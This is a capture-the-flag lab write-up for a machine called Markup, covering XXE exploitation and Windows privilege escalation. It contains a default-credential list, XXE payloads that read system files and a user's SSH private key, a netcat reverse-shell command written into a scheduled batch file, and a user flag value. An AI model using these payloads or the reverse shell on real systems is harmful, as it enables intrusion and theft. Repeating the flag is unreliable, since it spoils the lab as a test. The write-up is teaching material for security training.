# Markup

## Markup Write-up

Prepared by: 0ne-nine9, ilinor

## Introduction

According to OWASP Top 10 list for 2017, XML External Entities (XXE or XEE) attacks took the fourth place on the list of most popular ways to exploit a web application.

But first, what is XML exactly? According to Wikipedia, "Extensible Markup Language (XML) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable."

What about XML entities? They "are a way of representing an item of data within an XML document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities \&lt; and \&gt; represent the characters < and > . These are metacharacters used to denote XML tags, and so must generally be represented using their entities when they appear within data. You can read more about this subject on PortSwigger's article linked here.

The vulnerability comes into play when a misconfiguration exists in the XML parser on the server's side. From OWASP's definition of XXE Processing:

"An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.

The XML 1.0 standard defines the structure of an XML document. The standard defines a concept called an entity, which is a storage unit of some type. There are a few different types of entities, external general/parameter parsed entity often shortened to external entity, that can access local or remote content via a declared system identifier. The system identifier is assumed to be a URI that can be dereferenced (accessed) by the XML processor when processing the entity. The XML processor then replaces occurrences of the named external entity with the contents dereferenced by the system identifier. If the system identifier contains tainted data and the XML processor dereferences this tainted data, the XML processor may disclose confidential information normally not accessible by the application. Similar attack vectors apply the usage of external DTDs, external stylesheets, external schemas, etc. which, when included, allow similar external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier. Since the attack occurs relative to the application processing the XML document, an attacker may use this trusted application to pivot to other internal systems, possibly disclosing other internal content via http(s) requests or launching a CSRF attack to any unprotected internal services. In some situations, an XML processor library that is vulnerable to client-side memory corruption issues may be exploited by dereferencing a malicious URI, possibly allowing arbitrary code execution under the application account. Other attacks can access local resources that may not stop returning data, possibly impacting application availability if too many threads or processes are not released."

Markup is a machine that explore precisely this vulnerability type, with a website that allows for user input to be parsed as XML.

## Enumeration

As per usual, we will start enumeration with an nmap scan. The flags used here ensure maximum compatibility with most internet speeds while bypassing firewall restrictions for service scanning and host discovery.

```
-sC : Equivalent to --script=default
-A : Enable OS detection, version detection, script scanning, and traceroute
-Pn : Treat all hosts as online -- skip host discovery
```

Once completed, the scan reports three open ports, 22, 80 and 443. Since we have no credentials at hand, we can start by exploring the webserver running on port 80.

We are met with a simple login page. Attempting a number of default credentials lands us on a successful login.

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```
admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
```

We successfully logged in with admin:password .

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Moving past the login screen, we are met with a number of resources. After a quick exploratory dive into each of them, we notice that the Order page could be of interest to us, since it presents us with a number of user input fields.

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

In order to better understand how this input functions, we will need to fire up BurpSuite, set up our FoxyProxy plug-in to intercept requests from port 8080, and interact with the input fields by filling in some random information and pressing the Submit button.

Searching for a XML exploitation cheatsheet we are met with several examples such as the following. From the above cheatsheet an excerpt can be taken that is of relevance to us.

```
Lets try to read /etc/passwd in different ways. For Windows you could try to read:
C:\windows\system32\drivers\etc\hosts
In this first case notice that SYSTEM "file:///etc/passwd" will also work.
```

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

Considering that the target is running a version of Windows, we will be using c:/windows/win.ini file in order to test out the exploit's validity. In BurpSuite, send the request to the Repeater module by right- clicking on the request and clicking Send to Repeater or by pressing the CTRL + R combination on your keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data section of the request to the following:

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

The result is pictured below. You can send the request from the Repeater and receive the server's Response with the data pictured below.

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

The output of the win.ini file on the target itself is displayed in our response message, which proves that the XML External Entity vulnerability is present.

## Foothold

We can try guessing where all the important files are located, however, it might turn out to be an endless road. Let's try to find something of importance on the HTML code of the web page.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<mark style="background-color:orange;">Modified by Daniel .</mark> This could be a hint towards a username present on the target system, since they would have access to the web page's source code for configuration purposes. Since we can already navigate the files present on the target system using the XXE vulnerability, let's attempt to navigate to the Daniel user's .ssh folder in order to attempt to retrieve their private key.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

The RSA key is printed out in the output, from where it can be placed in a local file on your machine named id\_rsa , which you can later use to connect to the target at any point in time. Pick a folder to create the file in and run the commands below.

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Next, copy the RSA key present in the Response in BurpSuite and paste it into the id\_rsa file using the text editor of your choice. It's also important to set the right privileges for the id\_rsa file so as to be accepted by your SSH client. The commands below will achieve and verify this.

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Following this, we can attempt to log in as the daniel user through our SSH client, using his private key.

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

We are successful, and the user flag can be retrieved from C:\Users\daniel\Desktop .

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

032d2fc8952a8c24e39c8f0ee9918ef7

## Privilege Escalation

In order to retrieve the Administrator flag, we will need to escalate our privileges. Let's check our current ones by typing the command below.

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Seeing as the privileges listed for the daniel user are not of very unique importance, we can move on to exploring the file system in hopes of discovering any uncommon files or folders that we could use to leverage our attack.

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

In the C: directory, there is a Recovery.txt file which seems uncommon, but is empty, as seen from the 0 bytes displayed next to the name of the file in our output above. However, the Log-Management folder might be of some use to us, as it's also uncommon. Inside it, we find a job.bat file, which upon further inspection offers us some insight into its' purpose.

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

The purpose of job.bat seems to be related to clearing logfiles, and it can only be run with an Administrator account. There is also mention of an executable named wevtutil , which upon further investigation is determined to be a Windows command that has the ability to retrieve information about event logs and publishers. It can also install and uninstall event manifests, run queries and export, archive and clear logs. We now understand the use of it in this case, alongside the el and cl parameters found in the job.bat file.

Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could at least edit the file, instead of running it, or if there are any mismatched permissions between the script and the usergroup or file configuration. We can achieve this by using the icacls command.

<figure><img src=".gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Looking at the permissions of job.bat using icacls reveals that the group BUILTIN\Users has full control (F) over the file. The BUILTIN\Users group represents all local users, which includes Daniel as well. We might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell.

Before then, we need to check if the wevtutil process mentioned in the job.bat file is running. We can see the currently scheduled tasks by typing the schtasks command. If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use powershell's ps command instead, which represents another security misconfiguration that works against the server.

We can see that the process wevtutil is running, which is the same process listed in the job.bat file. This indicates that the .bat script might be executing.

Because the target host does not have access to the Internet, we will need to deliver the nc64.exe executable through our own connection with the target. In order to do so, we will first need to download nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we have on the host to issue a wget command with our address and the nc64.exe file residing on our server. This will initialize a download from the host to our Python server for the executable. Make sure you don't switch folders after downloading the executable. The Python HTTP server needs to be running in the same directory as the location of the downloaded nc64.exe file we want to deliver to the target.

In order to download the executable on our system, we can use this link:

```
  https://github.com/int0x33/nc.exe/blob/master/nc64.exe
```

<figure><img src=".gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Switching to the shell we have on the host, we can issue the download command targetting our own IP address on the VPN. Replace the {your\_IP} parameter in the command pictured below with the IP address assigned on your own machine to the tun0 interface. You can check this by running ip a or ifconfig on one of your own terminals.

<figure><img src=".gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Since we have full control over the job.bat script, we will modify its' contents by running the following command. Make sure to run it from the Windows Command Line, where the daniel@MARKUP user is displayed before every command, and not from Windows PowerShell, where PS is displayed before every command. As before, make sure to change the {your\_IP} parameter with the IP address assigned to your

tun0 interface and the {port} parameter with a port of your choice, which you will listen for connections on.

```
echo C:\Log-Management\nc64.exe -e cmd.exe {your_IP} {port} > C:\Log-Management\job.bat
```

We will turn on the netcat listener and wait for the script to execute.

<figure><img src=".gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Once the script executes, we receive a shell on the terminal tab the listener was active on.

The reverse shell might be slow, in that case, either be patient or quickly read the root flag directly without navigating around the target directories using the following command:

```
type C:\Users\Administrator\Desktop\root.txt
```

The exploit might not work on the first attempt. Due to the sensitivity of the exploit, many attempts might lead to failure, in which case the exploit should be run multiple times until it becomes successful. There is no workaround for an unstable exploit.

Make sure you are not running the echo command from PowerShell.

<figure><img src=".gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

You have successfully rooted the Markup machine! Congratulations!
